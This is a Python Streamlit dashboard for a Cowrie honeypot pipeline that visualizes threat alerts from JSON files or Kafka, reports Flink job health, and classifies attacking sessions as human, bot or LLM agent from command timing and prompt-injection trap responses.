"""
HoneyPot Threat Detection Dashboard

A Streamlit dashboard to visualize threat detection results and response actions.
"""

import streamlit as st
import json
import os
import pandas as pd
from datetime import datetime, timedelta, timezone
from pathlib import Path
import plotly.express as px
import plotly.graph_objects as go
import sys
import subprocess
import random
import ipaddress
import urllib.error
import urllib.request
from typing import Dict, Any, List, Optional, Union


def _cloudera_jwt_status() -> Dict[str, Any]:
    """Decode CLOUDERA_JWT_TOKEN payload (no signature verify) for expiry UX."""
    # Prefer Settings session value (updated by Apply) over process env.
    token = (
        st.session_state.get("settings_cloudera_jwt")
        or os.environ.get("CLOUDERA_JWT_TOKEN")
        or os.environ.get("CLOUDERA_API_KEY")
        or ""
    ).strip()
    if not token:
        return {"ok": False, "reason": "missing", "message": "No Cloudera JWT set — add it in Settings."}
    try:
        import base64

        parts = token.split(".")
        if len(parts) < 2:
            return {"ok": False, "reason": "malformed", "message": "Cloudera JWT is malformed."}
        payload_b64 = parts[1] + "=" * (-len(parts[1]) % 4)
        payload = json.loads(base64.urlsafe_b64decode(payload_b64.encode("utf-8")))
        exp = payload.get("exp")
        if exp is None:
            return {"ok": True, "reason": "no_exp", "message": "JWT present (no exp claim)."}
        exp_i = int(exp)
        now = int(datetime.now(timezone.utc).timestamp())
        if exp_i <= now:
            ago = now - exp_i
            return {
                "ok": False,
                "reason": "expired",
                "message": (
                    f"Cloudera JWT expired {ago // 60}m ago — paste a fresh token in **Settings** "
                    "and click Apply."
                ),
                "exp": exp_i,
            }
        return {
            "ok": True,
            "reason": "valid",
            "message": f"JWT OK · expires in {(exp_i - now) // 60}m",
            "exp": exp_i,
        }
    except Exception as exc:
        return {"ok": False, "reason": "decode_error", "message": f"Could not decode JWT: {exc}"}


def _humanize_react_error(err: Any) -> str:
    """Map opaque API/JSON failures to actionable ReAct Lab messages."""
    text = str(err or "").strip() or "No ReAct markers"
    low = text.lower()
    jwt = _cloudera_jwt_status()
    jwt_ok = bool(jwt.get("ok"))

    # Stale "expired" errors after a successful Settings Apply should not stick.
    if jwt_ok and (
        "token has expired" in low
        or ("jwt" in low and "expir" in low)
        or "expecting value" in low
        or "line 1 column 1" in low
    ):
        return (
            "Previous run failed while the JWT was expired/invalid. "
            "Current token looks valid — click ⭐ Test ReAct again."
        )

    if "expecting value" in low or "line 1 column 1" in low:
        if not jwt_ok and jwt.get("reason") == "expired":
            return jwt["message"]
        return (
            "Cloudera returned an empty/non-JSON body (often an expired JWT or bad base URL). "
            "Update the JWT in **Settings**, Apply, then re-run."
        )
    if "token has expired" in low or ("jwt" in low and "expir" in low):
        if not jwt_ok:
            return jwt.get("message") or (
                "Cloudera JWT expired — paste a fresh token in **Settings** and Apply."
            )
        return (
            "Cloudera rejected the previous token as expired. "
            "Current token looks valid — re-run the test."
        )
    if "401" in text or "authentication" in low:
        return f"Cloudera auth failed (401). Check JWT in Settings. Detail: {text[:160]}"
    return text


def _react_reasoning_is_guardrail_only(text: Any) -> bool:
    """True only when LLM reasoning is missing (not merely annotated with guardrail)."""
    s = str(text or "").strip()
    if not s:
        return True
    # Real Cloudera text is often annotated with "[guardrail: …]" after policy merge;
    # that alone is not guardrail-only.
    return s.startswith("No reasoning provided") or s.startswith("Policy classified")


def _format_react_reasoning_caption(text: Any) -> str:
    """Explain guardrail-only fallback vs real LLM reasoning."""
    s = str(text or "").strip()
    if not s:
        return ""
    if _react_reasoning_is_guardrail_only(s):
        return (
            "Guardrail-only (no LLM reasoning) — Cloudera did not return analysis, "
            "so policy mapped the Cowrie eventid to a threat. "
            f"Detail: {s[:200]}{'…' if len(s) > 200 else ''}"
        )
    return f"ReAct reasoning: {s[:240]}{'…' if len(s) > 240 else ''}"


def _scroll_main_to_top() -> None:
    """Force the Streamlit main pane to the top (used on page/tab changes)."""
    import streamlit.components.v1 as components

    # Delay slightly so Streamlit can paint the new page before we scroll.
    components.html(
        """
        <script>
        (function () {
          function jump() {
            const doc = window.parent.document;
            const nodes = [
              doc.querySelector('[data-testid="stAppViewContainer"]'),
              doc.querySelector('[data-testid="stMain"]'),
              doc.querySelector('section.main'),
              doc.querySelector('.main'),
              doc.scrollingElement,
              doc.documentElement,
              doc.body,
            ];
            for (const el of nodes) {
              if (!el) continue;
              if (typeof el.scrollTo === 'function') {
                try { el.scrollTo({ top: 0, left: 0, behavior: 'instant' }); }
                catch (e) { el.scrollTop = 0; }
              } else {
                el.scrollTop = 0;
              }
            }
            try { window.parent.scrollTo(0, 0); } catch (e) {}
          }
          jump();
          setTimeout(jump, 50);
          setTimeout(jump, 200);
        })();
        </script>
        """,
        height=0,
        width=0,
    )


def _parse_alert_timestamp(value: Union[str, datetime, None]) -> Optional[datetime]:
    """Parse alert timestamps as UTC-aware datetimes for safe sorting/comparison."""
    if value is None:
        return None
    if isinstance(value, datetime):
        dt = value
        if dt.tzinfo is None:
            return dt.replace(tzinfo=timezone.utc)
        return dt.astimezone(timezone.utc)
    s = str(value).strip()
    if not s or s.lower() == "n/a":
        return None
    try:
        if s.endswith("Z"):
            s = s[:-1] + "+00:00"
        dt = datetime.fromisoformat(s)
        if dt.tzinfo is None:
            return dt.replace(tzinfo=timezone.utc)
        return dt.astimezone(timezone.utc)
    except Exception:
        return None


def _coerce_timeline_dataframe(
    df: pd.DataFrame,
    *,
    column: str = "Timestamp",
) -> pd.DataFrame:
    """Normalize a timeline column to UTC and sort safely."""
    if df.empty or column not in df.columns:
        return df
    out = df.copy()
    out[column] = pd.to_datetime(out[column], utc=True, errors="coerce")
    out = out.dropna(subset=[column])
    return out.sort_values(column)

# -----------------------------
# Data source configuration
# -----------------------------

_PREDEFINED_KAFKA_TOPICS = [
    "cowrie.alerts",       # Phase 2 workflow (deterministic detection + response_actions)
    "cowrie.react_alerts", # Phase 3 ReAct (LLM detection + counter_attack_actions)
    "Both (workflow + ReAct)",
]

_KAFKA_SESSION_ACTOR_TOPIC = os.environ.get("KAFKA_SESSION_ACTOR_TOPIC", "cowrie.session_actor")
_KAFKA_ENRICHED_TOPIC = os.environ.get("KAFKA_NORMALIZED_ENRICHED_TOPIC", "cowrie.normalized.enriched")
_PHASE15_PIPELINE_TOPICS = [
    "cowrie.normalized",
    _KAFKA_ENRICHED_TOPIC,
    _KAFKA_SESSION_ACTOR_TOPIC,
]
_PHASE15_FLINK_JOBS = [
    "Cowrie Phase1 Normalize (Kafka)",
    "Cowrie Phase1.5 Actor Classify (Kafka)",
    "Cowrie Phase2 Workflow (Kafka)",
]

ACTOR_CLASS_LABELS = {
    "confirmed_llm": "Confirmed LLM",
    "potential_llm": "Potential LLM",
    "human": "Human",
    "bot": "Bot",
    "unknown": "Unknown",
}

ACTOR_CLASS_EMOJI = {
    "confirmed_llm": "🤖",
    "potential_llm": "🧠",
    "human": "👤",
    "bot": "⚙️",
    "unknown": "❓",
}


def alert_actor_class(alert: dict) -> str:
    """Resolve Palisade-style actor_class from alert or attack_details."""
    if not isinstance(alert, dict):
        return "unknown"
    ac = alert.get("actor_class")
    if ac:
        return str(ac)
    details = alert.get("attack_details") or {}
    if isinstance(details, dict) and details.get("actor_class"):
        return str(details.get("actor_class"))
    return "unknown"


def alert_actor_median_delta(alert: dict) -> Optional[float]:
    if not isinstance(alert, dict):
        return None
    md = alert.get("median_delta_sec")
    if md is not None:
        try:
            return float(md)
        except (TypeError, ValueError):
            pass
    details = alert.get("attack_details") or {}
    if isinstance(details, dict) and details.get("median_delta_sec") is not None:
        try:
            return float(details.get("median_delta_sec"))
        except (TypeError, ValueError):
            return None
    return None


def alert_injection_compliance(alert: dict) -> Optional[dict]:
    if not isinstance(alert, dict):
        return None
    ic = alert.get("injection_compliance")
    if isinstance(ic, dict):
        return ic
    details = alert.get("attack_details") or {}
    if isinstance(details, dict) and isinstance(details.get("injection_compliance"), dict):
        return details.get("injection_compliance")
    return None


def actor_class_display(actor_class: str) -> str:
    key = (actor_class or "unknown").strip().lower()
    emoji = ACTOR_CLASS_EMOJI.get(key, "❓")
    label = ACTOR_CLASS_LABELS.get(key, key.replace("_", " ").title())
    return f"{emoji} {label}"


def actor_class_badge_html(actor_class: str) -> str:
    key = (actor_class or "unknown").strip().lower()
    # Studio-aligned palette (purple chrome + orange accent family)
    colors = {
        "confirmed_llm": "#120046",
        "potential_llm": "#6b4cff",
        "human": "#2f8f55",
        "bot": "#5c5278",
        "unknown": "#9a92b0",
    }
    color = colors.get(key, "#9a92b0")
    label = actor_class_display(actor_class)
    return (
        f"<span style='background:{color};color:white;padding:3px 10px;"
        f"border-radius:999px;font-size:0.85em;font-weight:600;"
        f"box-shadow:0 1px 2px rgba(18,0,70,0.12);'>{label}</span>"
    )


def _get_kafka_client_error() -> Optional[str]:
    try:
        import kafka  # noqa: F401
        return None
    except Exception:
        return (
            "Kafka client not available. Install `kafka-python` (or run inside the Docker setup) "
            "to enable Kafka data source."
        )


# Repo root (parent of dashboard/) so `cowrie_log_processor` imports work when not cwd=/opt/flink
_DASHBOARD_DIR = os.path.dirname(os.path.abspath(__file__))
_REPO_ROOT = os.path.abspath(os.path.join(_DASHBOARD_DIR, ".."))
if _REPO_ROOT not in sys.path:
    sys.path.insert(0, _REPO_ROOT)

try:
    from cowrie_pipeline import is_react_agent_alert
except ImportError:
    def is_react_agent_alert(alert) -> bool:  # type: ignore[misc]
        if not isinstance(alert, dict):
            return False
        return str(alert.get("detection_source", "")).lower() == "cloudera_react"

try:
    from react_agent_ui_test import (
        ATTACK_TYPES,
        get_react_diagnostics,
        run_compare_test,
        run_kafka_phase3_test,
        run_pipeline_test,
    )
    REACT_UI_TEST_AVAILABLE = True
except Exception:
    # ImportError, FileNotFoundError (missing sibling .pyc), etc.
    REACT_UI_TEST_AVAILABLE = False
    ATTACK_TYPES = ()  # type: ignore[misc,assignment]

# Try to import ipwhois
try:
    from ipwhois import IPWhois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# Page configuration
st.set_page_config(
    page_title="Ratatoskr · HoneyPot Threat Detection",
    page_icon="🍯",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Studio / Designer–aligned tokens (Cloudera orange + purple, light canvas)
STUDIO_ORANGE = "#ff550d"
STUDIO_PURPLE = "#120046"
STUDIO_CANVAS = "#f4f1fa"
STUDIO_PANEL = "#ffffff"
STUDIO_TEXT = "#1a1038"
STUDIO_MUTED = "#5c5278"
SEVERITY_COLOR_MAP = {
    "CRITICAL": "#dc2626",
    "HIGH": "#ff550d",
    "MEDIUM": "#e08a14",
    "LOW": "#2f8f55",
}
ACTOR_COLOR_SEQUENCE = ["#120046", "#6b4cff", "#ff550d", "#2f8f55", "#5c5278", "#9a92b0"]

# Plotly default template — white panels on lavender canvas
try:
    import plotly.io as pio

    pio.templates["ratatoskr_studio"] = go.layout.Template(
        layout=go.Layout(
            paper_bgcolor=STUDIO_CANVAS,
            plot_bgcolor=STUDIO_PANEL,
            font=dict(color=STUDIO_TEXT, family="Segoe UI, system-ui, sans-serif"),
            title=dict(font=dict(color=STUDIO_PURPLE, size=16)),
            colorway=ACTOR_COLOR_SEQUENCE,
            xaxis=dict(gridcolor="#e8e2f4", zerolinecolor="#d9d0ec", linecolor="#d9d0ec"),
            yaxis=dict(gridcolor="#e8e2f4", zerolinecolor="#d9d0ec", linecolor="#d9d0ec"),
            legend=dict(bgcolor="rgba(255,255,255,0.92)", bordercolor="#d9d0ec"),
            margin=dict(l=40, r=24, t=48, b=40),
        )
    )
    pio.templates.default = "ratatoskr_studio"
except Exception:
    pass

# Custom CSS — Studio light workspace; readable light sidebar (not purple-on-purple)
st.markdown("""
    <style>
    :root {
      --studio-orange: #ff550d;
      --studio-purple: #120046;
      --studio-canvas: #f4f1fa;
      --studio-panel: #ffffff;
      --studio-border: #d9d0ec;
      --studio-text: #1a1038;
      --studio-muted: #5c5278;
    }
    .stApp {
      background: var(--studio-canvas);
      color: var(--studio-text);
    }
    /* Light sidebar — dark text, compact chrome */
    section[data-testid="stSidebar"] {
      background: var(--studio-panel) !important;
      border-right: 1px solid var(--studio-border);
      min-width: 15.5rem !important;
      max-width: 17.5rem !important;
    }
    section[data-testid="stSidebar"] > div {
      padding-top: 0.75rem;
    }
    section[data-testid="stSidebar"] .stMarkdown,
    section[data-testid="stSidebar"] .stCaption,
    section[data-testid="stSidebar"] label,
    section[data-testid="stSidebar"] p,
    section[data-testid="stSidebar"] span,
    section[data-testid="stSidebar"] .stRadio label,
    section[data-testid="stSidebar"] [data-baseweb="radio"] label {
      color: var(--studio-text) !important;
    }
    section[data-testid="stSidebar"] .stCaption,
    section[data-testid="stSidebar"] .stCaption p {
      color: var(--studio-muted) !important;
      font-size: 0.78rem !important;
      line-height: 1.25 !important;
    }
    section[data-testid="stSidebar"] h1,
    section[data-testid="stSidebar"] h2,
    section[data-testid="stSidebar"] h3 {
      color: var(--studio-purple) !important;
      font-size: 0.95rem !important;
      margin: 0.35rem 0 0.25rem !important;
    }
    section[data-testid="stSidebar"] hr {
      margin: 0.55rem 0 !important;
      border-color: var(--studio-border) !important;
    }
    section[data-testid="stSidebar"] .stButton > button {
      font-size: 0.85rem;
      padding: 0.35rem 0.6rem;
    }
    section[data-testid="stSidebar"] [data-testid="stExpander"] {
      background: var(--studio-canvas);
      border: 1px solid var(--studio-border);
      border-radius: 8px;
      box-shadow: none;
      margin-bottom: 0.4rem;
    }
    section[data-testid="stSidebar"] [data-testid="stExpander"] summary,
    section[data-testid="stSidebar"] [data-testid="stExpander"] summary p,
    section[data-testid="stSidebar"] [data-testid="stExpander"] summary span {
      color: var(--studio-purple) !important;
      font-size: 0.85rem !important;
      font-weight: 600 !important;
    }
    .sidebar-brand {
      padding: 0.15rem 0 0.55rem;
      border-bottom: 2px solid var(--studio-orange);
      margin-bottom: 0.65rem;
    }
    .sidebar-brand .eyebrow {
      font-size: 0.65rem;
      letter-spacing: 0.1em;
      text-transform: uppercase;
      color: var(--studio-muted);
    }
    .sidebar-brand .title {
      font-size: 1.15rem;
      font-weight: 700;
      color: var(--studio-purple);
      line-height: 1.15;
    }
    .main-header {
        font-size: 2.1rem;
        font-weight: 700;
        color: var(--studio-purple);
        text-align: left;
        padding: 0.35rem 0 0.75rem;
        border-bottom: 3px solid var(--studio-orange);
        margin-bottom: 1rem;
    }
    .metric-card, div[data-testid="stMetric"] {
        background-color: var(--studio-panel);
        padding: 0.85rem 1rem;
        border-radius: 10px;
        border: 1px solid var(--studio-border);
        border-left: 4px solid var(--studio-orange);
        box-shadow: 0 1px 3px rgba(18, 0, 70, 0.08);
    }
    div[data-testid="stMetric"] label,
    div[data-testid="stMetricLabel"],
    div[data-testid="stMetricLabel"] p {
        color: var(--studio-muted) !important;
        font-size: 0.8rem !important;
        font-weight: 600 !important;
        letter-spacing: 0.02em;
        opacity: 1 !important;
    }
    div[data-testid="stMetric"] [data-testid="stMetricValue"],
    div[data-testid="stMetricValue"] {
        color: var(--studio-purple) !important;
        font-size: 1.55rem !important;
        font-weight: 700 !important;
        line-height: 1.2 !important;
    }
    div[data-testid="stMetric"] [data-testid="stMetricDelta"] {
        color: var(--studio-muted) !important;
    }
    .result-card {
        background: var(--studio-panel);
        border: 1px solid var(--studio-border);
        border-left: 4px solid var(--studio-orange);
        border-radius: 10px;
        padding: 0.9rem 1rem 0.75rem;
        margin: 0.65rem 0 1rem;
    }
    .result-card .result-title {
        color: var(--studio-purple);
        font-weight: 700;
        font-size: 1.05rem;
        margin: 0 0 0.35rem;
    }
    .result-card .result-meta {
        color: var(--studio-muted);
        font-size: 0.82rem;
        line-height: 1.4;
        margin: 0.4rem 0 0.2rem;
    }
    .result-card .result-meta strong {
        color: var(--studio-text);
        font-weight: 600;
    }
    .eff-grid {
        display: grid;
        grid-template-columns: repeat(3, minmax(0, 1fr));
        gap: 0.65rem;
        margin: 0.5rem 0 1rem;
    }
    .eff-cell {
        background: var(--studio-panel);
        border: 1px solid var(--studio-border);
        border-left: 4px solid var(--studio-orange);
        border-radius: 10px;
        padding: 0.75rem 0.9rem;
    }
    .eff-cell .label {
        color: var(--studio-muted);
        font-size: 0.78rem;
        font-weight: 600;
        margin-bottom: 0.25rem;
    }
    .eff-cell .value {
        color: var(--studio-purple);
        font-size: 1.6rem;
        font-weight: 700;
        line-height: 1.1;
    }
    div[data-testid="stExpander"],
    div[data-testid="stVerticalBlockBorderWrapper"] {
        background: var(--studio-panel);
        border: 1px solid var(--studio-border);
        border-radius: 10px;
        box-shadow: 0 1px 3px rgba(18, 0, 70, 0.06);
    }
    .stButton > button {
        background: var(--studio-orange);
        color: #fff;
        border: none;
        border-radius: 8px;
        font-weight: 600;
    }
    .stButton > button:hover {
        background: #ff7a3d;
        color: #fff;
        border: none;
    }
    .severity-critical { color: #dc2626; font-weight: bold; }
    .severity-high { color: #ff550d; font-weight: bold; }
    .severity-medium { color: #e08a14; font-weight: bold; }
    .severity-low { color: #2f8f55; font-weight: bold; }
    .react-agent-star {
        color: #ff550d;
        font-size: 1.05em;
        text-shadow: 0 0 6px rgba(255, 85, 13, 0.35);
    }
    .actor-confirmed-llm { color: #120046; font-weight: bold; }
    .actor-potential-llm { color: #6b4cff; font-weight: bold; }
    .actor-human { color: #2f8f55; font-weight: bold; }
    .actor-bot { color: #5c5278; font-weight: bold; }
    h1, h2, h3 { color: var(--studio-purple) !important; }
    </style>
""", unsafe_allow_html=True)

# Load dashboard data
@st.cache_data(ttl=2)  # Cache for 2 seconds to allow frequent auto-refresh
def load_dashboard_data():
    """Load threat detection data from JSON file."""
    # Try multiple possible locations (local and Docker)
    possible_paths = [
        "cowrie-dashboard-data.json",
        "/opt/flink/cowrie-dashboard-data.json",
        os.path.join(os.getcwd(), "cowrie-dashboard-data.json"),
    ]
    
    dashboard_file = None
    for path in possible_paths:
        if os.path.exists(path):
            dashboard_file = path
            break
    
    # Expose which file we loaded so the UI can display it for validation/debugging.
    st.session_state["cowrie_dashboard_file"] = dashboard_file

    if not dashboard_file:
        return []
    
    try:
        with open(dashboard_file, 'r') as f:
            data = json.load(f)
        return data
    except Exception as e:
        st.error(f"Error loading dashboard data from {dashboard_file}: {e}")
        return []


@st.cache_data(ttl=2)
def load_dashboard_data_from_kafka(
    *,
    bootstrap_servers: str,
    topic: str,
    max_messages: int,
) -> list:
    """
    Load the latest dashboard alerts directly from Kafka.

    Returns a list of alert dicts (same shape as cowrie-dashboard-data.json entries).
    """
    err = _get_kafka_client_error()
    if err:
        st.session_state["cowrie_dashboard_kafka"] = {
            "enabled": False,
            "error": err,
            "bootstrap_servers": bootstrap_servers,
            "topic": topic,
        }
        return []

    from kafka import KafkaConsumer, TopicPartition

    try:
        consumer = KafkaConsumer(
            topic,
            bootstrap_servers=bootstrap_servers,
            group_id=None,  # don't affect committed offsets
            enable_auto_commit=False,
            auto_offset_reset="latest",
            consumer_timeout_ms=1200,
            value_deserializer=lambda v: v.decode("utf-8", errors="ignore"),
        )
    except Exception as exc:
        hint = (
            " Inside Docker use bootstrap `kafka:9092` (not localhost:9092). "
            "Recreate the dashboard if it is not on the flink-network."
        )
        st.session_state["cowrie_dashboard_kafka"] = {
            "enabled": False,
            "error": f"{exc}.{hint}",
            "bootstrap_servers": bootstrap_servers,
            "topic": topic,
        }
        return []

    alerts = []
    try:
        # Ensure partitions are assigned.
        consumer.poll(timeout_ms=250)
        tps = list(consumer.assignment())
        if not tps:
            st.session_state["cowrie_dashboard_kafka"] = {
                "enabled": True,
                "bootstrap_servers": bootstrap_servers,
                "topic": topic,
                "partitions": 0,
            }
            return []

        # Seek near the end so we only read a recent window.
        end_offsets = consumer.end_offsets(tps)
        per_partition = max(1, int(max_messages / max(1, len(tps))))
        for tp in tps:
            end = int(end_offsets.get(tp, 0))
            start = max(end - per_partition, 0)
            consumer.seek(tp, start)

        for msg in consumer:
            raw = (msg.value or "").strip()
            if not raw:
                continue
            try:
                alert = json.loads(raw)
            except Exception:
                continue
            if isinstance(alert, dict):
                alerts.append(alert)
            if len(alerts) >= max_messages:
                break
    finally:
        try:
            consumer.close(autocommit=False)
        except Exception:
            pass

    st.session_state["cowrie_dashboard_kafka"] = {
        "enabled": True,
        "bootstrap_servers": bootstrap_servers,
        "topic": topic,
        "partitions": len(consumer.assignment()) if hasattr(consumer, "assignment") else None,
        "returned": len(alerts),
    }
    return alerts


@st.cache_data(ttl=5)
def load_session_actor_from_kafka(
    bootstrap_servers: str,
    topic: str = _KAFKA_SESSION_ACTOR_TOPIC,
    max_messages: int = 100,
) -> list:
    """Load Phase 1.5 session actor scores from Kafka (cowrie.session_actor)."""
    err = _get_kafka_client_error()
    if err:
        st.session_state["cowrie_session_actor_kafka"] = {"enabled": False, "error": err}
        return []

    from kafka import KafkaConsumer

    try:
        consumer = KafkaConsumer(
            topic,
            bootstrap_servers=bootstrap_servers,
            group_id=None,
            enable_auto_commit=False,
            auto_offset_reset="latest",
            consumer_timeout_ms=1200,
            value_deserializer=lambda v: v.decode("utf-8", errors="ignore"),
        )
    except Exception as exc:
        st.session_state["cowrie_session_actor_kafka"] = {
            "enabled": False,
            "error": str(exc),
        }
        return []

    scores: list = []
    try:
        consumer.poll(timeout_ms=250)
        tps = list(consumer.assignment())
        if not tps:
            st.session_state["cowrie_session_actor_kafka"] = {
                "enabled": True,
                "topic": topic,
                "returned": 0,
            }
            return []

        end_offsets = consumer.end_offsets(tps)
        per_partition = max(1, int(max_messages / max(1, len(tps))))
        for tp in tps:
            end = int(end_offsets.get(tp, 0))
            start = max(end - per_partition, 0)
            consumer.seek(tp, start)

        for msg in consumer:
            raw = (msg.value or "").strip()
            if not raw:
                continue
            try:
                row = json.loads(raw)
            except Exception:
                continue
            if isinstance(row, dict) and row.get("session_id"):
                scores.append(row)
            if len(scores) >= max_messages:
                break
    finally:
        try:
            consumer.close(autocommit=False)
        except Exception:
            pass

    st.session_state["cowrie_session_actor_kafka"] = {
        "enabled": True,
        "topic": topic,
        "returned": len(scores),
    }
    return scores


@st.cache_data(ttl=10)
def _kafka_topic_message_counts(bootstrap_servers: str, topics: List[str]) -> Dict[str, Any]:
    """Approximate high-water message counts per Kafka topic (sum of partition end offsets)."""
    err = _get_kafka_client_error()
    if err:
        return {"error": err, "topics": {}}

    from kafka import KafkaConsumer, TopicPartition

    try:
        consumer = KafkaConsumer(
            bootstrap_servers=bootstrap_servers,
            consumer_timeout_ms=1500,
        )
    except Exception as exc:
        return {"error": str(exc), "topics": {}}

    counts: Dict[str, int] = {}
    try:
        for topic in topics:
            parts = consumer.partitions_for_topic(topic)
            if not parts:
                counts[topic] = 0
                continue
            tps = [TopicPartition(topic, p) for p in sorted(parts)]
            end = consumer.end_offsets(tps)
            counts[topic] = int(sum(end.values()))
    except Exception as exc:
        return {"error": str(exc), "topics": counts}
    finally:
        try:
            consumer.close(autocommit=False)
        except Exception:
            pass
    return {"error": None, "topics": counts}


@st.cache_data(ttl=10)
def _flink_phase_job_status() -> Dict[str, Any]:
    """Poll Flink REST for Cowrie Phase 1 / 1.5 / 2 job states."""
    host = os.environ.get("FLINK_REST_ADDRESS", "jobmanager").strip() or "jobmanager"
    port = os.environ.get("FLINK_REST_PORT", "8081").strip() or "8081"
    url = f"http://{host}:{port}/jobs/overview"
    try:
        with urllib.request.urlopen(url, timeout=3) as resp:
            overview = json.loads(resp.read().decode())
    except (urllib.error.URLError, TimeoutError, json.JSONDecodeError) as exc:
        return {"error": str(exc), "jobs": {}}

    # Prefer RUNNING over FAILED when duplicate names exist in overview.
    jobs: Dict[str, str] = {}
    priority = {"RUNNING": 3, "CREATED": 2, "RESTARTING": 2, "FAILED": 1, "CANCELED": 0}
    for job in overview.get("jobs", []):
        name = job.get("name")
        if name not in _PHASE15_FLINK_JOBS:
            continue
        state = str(job.get("state") or "UNKNOWN")
        if name not in jobs or priority.get(state, 0) > priority.get(jobs[name], 0):
            jobs[name] = state
    for name in _PHASE15_FLINK_JOBS:
        jobs.setdefault(name, "MISSING")
    return {"error": None, "jobs": jobs}


def load_phase15_pipeline_health(bootstrap_servers: str) -> Dict[str, Any]:
    """Kafka topic counts + Flink job states for the Phase 1.5 path."""
    return {
        "kafka": _kafka_topic_message_counts(bootstrap_servers, _PHASE15_PIPELINE_TOPICS),
        "flink": _flink_phase_job_status(),
    }


def _dedupe_session_scores(scores: list) -> list:
    """Keep latest score per session_id."""
    by_session: Dict[str, dict] = {}
    for row in scores or []:
        if not isinstance(row, dict):
            continue
        sid = str(row.get("session_id") or "")
        if not sid:
            continue
        by_session[sid] = row
    return list(by_session.values())


def _render_actor_classification_panel(alert: dict) -> None:
    """Show actor_class, timing, and injection compliance for one alert."""
    ac = alert_actor_class(alert)
    st.markdown(f"**Actor class:** {actor_class_badge_html(ac)}", unsafe_allow_html=True)
    median = alert_actor_median_delta(alert)
    if median is not None:
        threshold = 1.7
        speed_hint = "fast (LLM-speed)" if median < threshold else "slow (human-speed)"
        st.caption(f"Median inter-command delta: **{median:.2f}s** ({speed_hint}; threshold {threshold}s)")
    compliance = alert_injection_compliance(alert)
    if compliance:
        gh = "yes" if compliance.get("goal_hijack") else "no"
        ps = "yes" if compliance.get("prompt_steal") else "no"
        st.caption(f"Injection compliance — goal hijack: **{gh}**, prompt steal: **{ps}**")


def render_ai_agent_detection_dashboard(
    alerts_data: list,
    session_scores: list,
    *,
    pipeline_health: Optional[Dict[str, Any]] = None,
    kafka_enabled: bool = False,
    sa_meta: Optional[Dict[str, Any]] = None,
) -> None:
    """Phase 1.5 — Palisade-style LLM agent detection view."""
    st.markdown(
        '<div class="main-header">AI Agent Detection</div>'
        '<p style="color:#5c5278;margin:-0.5rem 0 1rem;">Phase 1.5 · session actor scoring</p>',
        unsafe_allow_html=True,
    )
    st.caption(
        "Timing + prompt-injection compliance from Cowrie traps. "
        "See [ACTOR_CLASSIFICATION.md](../docs/ACTOR_CLASSIFICATION.md) for pipeline details."
    )

    session_scores = _dedupe_session_scores(session_scores)
    last_classified = None
    for row in session_scores:
        ts = row.get("classified_at")
        if ts and (last_classified is None or str(ts) > str(last_classified)):
            last_classified = ts

    with st.expander("🔌 Pipeline health", expanded=False):
        if not kafka_enabled:
            st.warning(
                "Data source is **JSON file only** — session scores and topic health need "
                "**Kafka topic** or **Both** in the sidebar."
            )
        elif pipeline_health:
            hc1, hc2 = st.columns(2)
            kafka_h = pipeline_health.get("kafka") or {}
            flink_h = pipeline_health.get("flink") or {}
            with hc1:
                st.markdown("**Kafka topics** (message count)")
                if kafka_h.get("error"):
                    st.error(kafka_h["error"])
                for topic, count in (kafka_h.get("topics") or {}).items():
                    st.write(f"`{topic}`: **{count}**")
            with hc2:
                st.markdown("**Flink jobs**")
                if flink_h.get("error"):
                    st.error(flink_h["error"])
                for job_name, state in (flink_h.get("jobs") or {}).items():
                    short = job_name.replace("Cowrie ", "").replace(" (Kafka)", "")
                    icon = "✅" if state == "RUNNING" else ("⚠️" if state == "MISSING" else "❌")
                    st.write(f"{icon} `{short}`: **{state}**")
            if last_classified:
                st.caption(f"Latest session score: `{last_classified}`")
            if sa_meta and sa_meta.get("error"):
                st.error(f"Session actor consumer: {sa_meta['error']}")
        else:
            st.caption("No pipeline health data yet.")

    alert_by_session: Dict[str, list] = {}
    for alert in alerts_data or []:
        if not isinstance(alert, dict):
            continue
        details = alert.get("attack_details") or {}
        sid = None
        if isinstance(details, dict):
            sid = details.get("session")
        if sid:
            alert_by_session.setdefault(str(sid), []).append(alert)

    col1, col2, col3, col4, col5, col6 = st.columns(6)
    all_classes = [alert_actor_class(a) for a in (alerts_data or [])]
    session_classes = [str(s.get("actor_class", "unknown")) for s in session_scores]
    combined_classes = all_classes + session_classes

    with col1:
        st.metric("Potential LLM", sum(1 for c in combined_classes if c == "potential_llm"))
    with col2:
        st.metric("Confirmed LLM", sum(1 for c in combined_classes if c == "confirmed_llm"))
    with col3:
        st.metric("Human", sum(1 for c in combined_classes if c == "human"))
    with col4:
        st.metric("Bot", sum(1 for c in combined_classes if c == "bot"))
    with col5:
        st.metric("Unknown", sum(1 for c in combined_classes if c == "unknown"))
    with col6:
        st.metric("Session scores (Kafka)", len(session_scores))

    has_classified = any(
        c in combined_classes for c in ("potential_llm", "confirmed_llm", "human", "bot")
    )
    if not has_classified and not session_scores:
        st.info(
            "No actor classification data yet. Phase 1.5 needs **new SSH sessions** after "
            "`flink-pipeline-supervisor` is running (Flink jobs consume `latest` offsets only)."
        )
        st.markdown("**Quick demo — inject a fast LLM-style session:**")
        st.code(
            "ratatoskr utils simulate-attacks --e2e --scenario fast_llm_agent_session",
            language="bash",
        )
        st.code(
            "ratatoskr utils simulate-attacks --e2e --scenario actor_classify_suite",
            language="bash",
        )
        st.caption(
            "Or run unit tests: `ratatoskr test actor-classify` · "
            "Then set sidebar **Data source** to **Both** and refresh."
        )

    st.header("📈 Actor class distribution")
    c1, c2 = st.columns(2)
    with c1:
        if alerts_data:
            counts: Dict[str, int] = {}
            for alert in alerts_data:
                ac = alert_actor_class(alert)
                counts[ac] = counts.get(ac, 0) + 1
            if counts:
                fig = px.pie(
                    values=list(counts.values()),
                    names=[actor_class_display(k) for k in counts.keys()],
                    title="Alerts by actor class",
                    color_discrete_sequence=ACTOR_COLOR_SEQUENCE,
                )
                st.plotly_chart(fig, use_container_width=True)
        else:
            st.info("No alerts loaded — ingest from JSON or Kafka.")

    with c2:
        timing_vals = [alert_actor_median_delta(a) for a in (alerts_data or [])]
        timing_vals = [v for v in timing_vals if v is not None]
        if timing_vals:
            st.caption("Median inter-command delta (seconds); paper threshold ~1.7s")
            upper = max(max(timing_vals) + 0.5, 2.51)
            bins = [0.0, 0.5, 1.0, 1.5, 2.0, 2.5, upper]
            labels = ["0-0.5s", "0.5-1.0s", "1.0-1.5s", "1.5-2.0s", "2.0-2.5s", "2.5s+"]
